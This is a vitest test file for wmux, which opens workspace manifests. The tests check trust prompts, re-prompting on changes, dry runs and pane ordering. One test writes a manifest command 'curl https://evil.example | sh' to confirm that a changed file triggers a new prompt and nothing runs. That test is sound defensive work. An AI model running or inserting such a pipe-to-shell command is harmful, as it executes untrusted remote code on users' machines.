import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import fs from 'fs';
import os from 'os';
import path from 'path';
import { openManifest, _resetOpenedWorkspaces, type OpenDeps, type TrustAnswer } from '../../src/main/workspace-open';
import { runPlan, type SchedulerIo } from '../../src/main/workspace-scheduler';
import { buildPlan, parseManifest, type WaitFor } from '../../src/main/workspace-manifest';
import { getTrustEntry } from '../../src/main/workspace-trust';

/**
 * #284 — opening a manifest end to end, against fake windows and PTYs. The
 * trust store is redirected into a temp APPDATA so no test touches the real one.
 */

let tmp: string;
let repo: string;
let savedAppData: string | undefined;

beforeEach(() => {
  tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'wmux-open-'));
  repo = path.join(tmp, 'repo');
  fs.mkdirSync(path.join(repo, 'apps', 'api'), { recursive: true });
  savedAppData = process.env.APPDATA;
  process.env.APPDATA = path.join(tmp, 'appdata');
  _resetOpenedWorkspaces();
});
afterEach(() => {
  process.env.APPDATA = savedAppData;
  fs.rmSync(tmp, { recursive: true, force: true });
});

function writeManifest(obj: unknown, name = 'wmux.workspace.json'): string {
  const file = path.join(repo, name);
  fs.mkdirSync(path.dirname(file), { recursive: true });
  fs.writeFileSync(file, JSON.stringify(obj, null, 2));
  return file;
}

const BASIC = {
  version: 1,
  name: 'demo',
  panes: [
    { id: 'db', run: ['docker compose up db'] },
    { id: 'api', cwd: 'apps/api', run: ['npm install', 'npm run dev'], runOnce: ['npm install'], after: ['db'], env: { PORT: '4000' } },
  ],
  browser: { tabs: ['http://localhost:4000'] },
};

interface Fake {
  deps: OpenDeps;
  prompts: { text: string; changed: unknown }[];
  delivered: { surface: string; commands: string[] }[];
  notices: { surface: string; text: string }[];
  created: unknown[];
  answer: TrustAnswer;
  settle: () => Promise<void>;
}

function fake(answer: TrustAnswer = 'run'): Fake {
  const f: Fake = {
    prompts: [], delivered: [], notices: [], created: [], answer,
    settle: async () => { for (let i = 0; i < 20; i++) await new Promise((r) => setImmediate(r)); },
    deps: undefined as unknown as OpenDeps,
  };
  let n = 0;
  f.deps = {
    confirm: async (_plan, text, changed) => { f.prompts.push({ text, changed }); return f.answer; },
    createWorkspace: async (spec) => {
      f.created.push(spec);
      const surfaces: Record<string, string> = {};
      for (const p of spec.panes) surfaces[p.key] = `surf-${p.key}-${++n}`;
      return { workspaceId: `ws-${n}`, surfaces };
    },
    focusWorkspace: async () => true,
    io: {
      deliver: (surface, commands) => { f.delivered.push({ surface, commands }); return true; },
      wait: async () => true,
      notice: (surface, text) => { f.notices.push({ surface, text }); },
      sleep: async () => {},
    },
    log: () => {},
  };
  return f;
}

describe('trust (#284)', () => {
  it('nothing runs before the user has seen every command and said yes', async () => {
    const file = writeManifest(BASIC);
    const f = fake('run');
    const result = await openManifest({ path: repo }, f.deps);
    await f.settle();
    expect(result).toMatchObject({ ok: true, ranCommands: true });
    expect(f.prompts).toHaveLength(1);
    expect(f.prompts[0].text).toContain('$ docker compose up db');
    expect(f.prompts[0].text).toContain('$ npm install    (first open only)');
    expect(f.delivered.map((d) => d.commands)).toEqual([['docker compose up db'], ['npm install', 'npm run dev']]);
    expect(getTrustEntry(file)?.hash).toBeTruthy();
  });

  it('cancel opens nothing and trusts nothing', async () => {
    const file = writeManifest(BASIC);
    const f = fake('cancel');
    expect(await openManifest({ path: repo }, f.deps)).toEqual({ ok: true, cancelled: true });
    expect(f.created).toHaveLength(0);
    expect(getTrustEntry(file)).toBeUndefined();
  });

  it('"open without running" brings the layout up, types nothing, trusts nothing, and says what it skipped', async () => {
    const file = writeManifest(BASIC);
    const f = fake('layout-only');
    const result = await openManifest({ path: repo }, f.deps);
    await f.settle();
    expect(result).toMatchObject({ ok: true, ranCommands: false });
    expect(f.created).toHaveLength(1);
    expect(f.delivered).toEqual([]);
    expect(f.notices.some((n) => n.text.includes('would run: docker compose up db'))).toBe(true);
    expect(getTrustEntry(file)).toBeUndefined();
  });

  it('the same file is not asked about twice; runOnce does not repeat', async () => {
    writeManifest(BASIC);
    const first = fake('run');
    await openManifest({ path: repo }, first.deps);
    await first.settle();
    _resetOpenedWorkspaces();
    const second = fake('cancel'); // would cancel if asked
    const result = await openManifest({ path: repo }, second.deps);
    await second.settle();
    expect(second.prompts).toHaveLength(0);
    expect(result).toMatchObject({ ok: true, ranCommands: true });
    expect(second.delivered.find((d) => d.surface.includes('api'))?.commands).toEqual(['npm run dev']);
  });

  it('ANY change re-prompts, and the prompt names what changed (a git pull cannot quietly repoint it)', async () => {
    writeManifest(BASIC);
    const first = fake('run');
    await openManifest({ path: repo }, first.deps);
    await first.settle();
    _resetOpenedWorkspaces();
    const changed = structuredClone(BASIC);
    changed.panes[0].run = ['curl https://evil.example | sh'];
    writeManifest(changed);
    const second = fake('cancel');
    await openManifest({ path: repo }, second.deps);
    expect(second.prompts).toHaveLength(1);
    expect(second.prompts[0].changed).toEqual({
      added: ['[db] curl https://evil.example | sh'],
      removed: ['[db] docker compose up db'],
    });
    expect(second.delivered).toEqual([]);
  });

  it('the trust store lives in wmux\'s data dir, never next to the manifest', async () => {
    writeManifest(BASIC);
    const f = fake('run');
    await openManifest({ path: repo }, f.deps);
    expect(fs.existsSync(path.join(tmp, 'appdata', 'wmux', 'workspace-trust.json'))).toBe(true);
    expect(fs.readdirSync(repo).sort()).toEqual(['apps', 'wmux.workspace.json']);
  });
});

describe('opening (#284)', () => {
  it('--dry-run shows the plan and creates nothing', async () => {
    writeManifest(BASIC);
    const f = fake();
    const result = await openManifest({ path: repo, dryRun: true }, f.deps);
    expect(result).toMatchObject({ ok: true, dryRun: true });
    expect((result as { plan: string }).plan).toContain('$ npm run dev');
    expect(f.created).toEqual([]);
    expect(f.prompts).toEqual([]);
  });

  it('builds one pane per manifest pane, with folders, env and browser tabs — and no commands in the store', async () => {
    writeManifest(BASIC);
    const f = fake();
    await openManifest({ path: repo }, f.deps);
    expect(f.created[0]).toEqual({
      title: 'demo',
      cwd: repo,
      layout: undefined,
      panes: [
        { key: 'db', title: 'db', cwd: repo, env: {} },
        { key: 'api', title: 'api', cwd: path.join(repo, 'apps', 'api'), env: { PORT: '4000' } },
      ],
      browser: { tabs: ['http://localhost:4000/'], active: 0 },
    });
  });

  it('re-opening an open manifest focuses it rather than starting everything twice', async () => {
    writeManifest(BASIC);
    const f = fake();
    await openManifest({ path: repo }, f.deps);
    const again = await openManifest({ path: repo }, f.deps);
    expect(again).toMatchObject({ ok: true, focused: true });
    expect(f.created).toHaveLength(1);
  });

  it('finds .wmux/workspace.json and resolves folders from the repo root', async () => {
    writeManifest(BASIC, path.join('.wmux', 'workspace.json'));
    const f = fake();
    await openManifest({ path: repo }, f.deps);
    expect((f.created[0] as { cwd: string }).cwd).toBe(repo);
  });

  it('a missing pane folder opens at the root and says so; nothing runs there', async () => {
    writeManifest({ version: 1, panes: [{ id: 'web', cwd: 'apps/web', run: ['npm run dev'] }] });
    const f = fake();
    await openManifest({ path: repo }, f.deps);
    await f.settle();
    expect(f.notices[0].text).toMatch(/does not exist/);
    expect(f.delivered).toEqual([]);
  });

  it.skipIf(process.platform !== 'win32')('a junction inside the repo that points outside it is refused', async () => {
    const outside = path.join(tmp, 'outside');
    fs.mkdirSync(outside);
    fs.symlinkSync(outside, path.join(repo, 'escape'), 'junction');
    writeManifest({ version: 1, panes: [{ cwd: 'escape', run: ['x'] }] });
    const result = await openManifest({ path: repo }, fake().deps);
    expect(result).toMatchObject({ ok: false });
    expect((result as { errors: string[] }).errors.join()).toMatch(/outside the repo/);
  });

  it('an invalid manifest is reported, never half-opened', async () => {
    writeManifest({ version: 1, panes: [{ cwd: '..', run: ['x'] }] });
    const f = fake();
    const result = await openManifest({ path: repo }, f.deps);
    expect(result).toMatchObject({ ok: false });
    expect(f.created).toEqual([]);
  });

  it('no manifest at the path is a clear error', async () => {
    const result = await openManifest({ path: path.join(tmp, 'nowhere') }, fake().deps);
    expect(result).toMatchObject({ ok: false });
  });
});

describe('ordering (#284)', () => {
  function planOf(obj: unknown) {
    return buildPlan(parseManifest(obj).manifest!, path.join(repo, 'wmux.workspace.json'), new Set()).panes;
  }

  it('a pane waits for every pane in its `after` before its commands are typed', async () => {
    const order: string[] = [];
    let releaseDb!: () => void;
    const dbReady = new Promise<void>((r) => { releaseDb = r; });
    const io: SchedulerIo = {
      deliver: (s, c) => { order.push(`${s}:${c.join(',')}`); return true; },
      wait: async (w: WaitFor) => {
        if (w.kind === 'port') {
          await dbReady;
        }
        return true;
      },
      notice: () => {},
      sleep: async () => {},
    };
    const panes = planOf({
      version: 1,
      panes: [
        { id: 'db', run: ['db-up'] },
        { id: 'api', run: ['api-up'], after: ['db'], waitFor: { port: 5432 } },
        { id: 'web', run: ['web-up'], after: ['api'] },
        { id: 'free', run: ['free-up'] },
      ],
    });
    const done = runPlan(panes, { db: 'S-db', api: 'S-api', web: 'S-web', free: 'S-free' }, io);
    for (let i = 0; i < 5; i++) await new Promise((r) => setImmediate(r));
    expect(order).toEqual(['S-db:db-up', 'S-free:free-up']); // api held by its port, web by api
    releaseDb();
    expect(await done).toEqual({ db: 'started', api: 'started', web: 'started', free: 'started' });
    expect(order.slice(2)).toEqual(['S-api:api-up', 'S-web:web-up']);
  });

  it('a wait that gives up says so in that pane, runs nothing there, and does not hang the rest', async () => {
    const notices: string[] = [];
    const delivered: string[] = [];
    const io: SchedulerIo = {
      deliver: (s) => { delivered.push(s); return true; },
      wait: async () => false,
      notice: (s, t) => notices.push(`${s}: ${t}`),
      sleep: async () => {},
    };
    const panes = planOf({ version: 1, panes: [{ id: 'api', run: ['x'], waitFor: { port: 4000 } }, { id: 'web', run: ['y'], after: ['api'] }] });
    const outcomes = await runPlan(panes, { api: 'S-api', web: 'S-web' }, io);
    expect(outcomes).toEqual({ api: 'wait-timeout', web: 'started' });
    expect(delivered).toEqual(['S-web']);
    expect(notices.some((n) => n.startsWith('S-api: gave up waiting for port 4000'))).toBe(true);
  });

  it('a held pane says what it is waiting for, so it never looks like it silently did nothing', async () => {
    const notices: string[] = [];
    const io: SchedulerIo = { deliver: () => true, wait: async () => true, notice: (_s, t) => notices.push(t), sleep: async () => {} };
    await runPlan(planOf({ version: 1, panes: [{ id: 'a', run: ['x'] }, { id: 'b', run: ['y'], after: ['a'] }] }), { a: 'A', b: 'B' }, io);
    expect(notices).toEqual(['waiting for a before running 1 command(s)…']);
  });

  it('a pane whose PTY never appears gives up instead of waiting forever', async () => {
    let clock = 0;
    const io: SchedulerIo = { deliver: () => false, wait: async () => true, notice: () => {}, sleep: async (ms) => { clock += ms; } };
    const outcomes = await runPlan(planOf({ version: 1, panes: [{ id: 'a', run: ['x'] }] }), { a: 'A' }, io);
    expect(outcomes).toEqual({ a: 'no-terminal' });
    expect(clock).toBeGreaterThanOrEqual(30_000);
  });
});
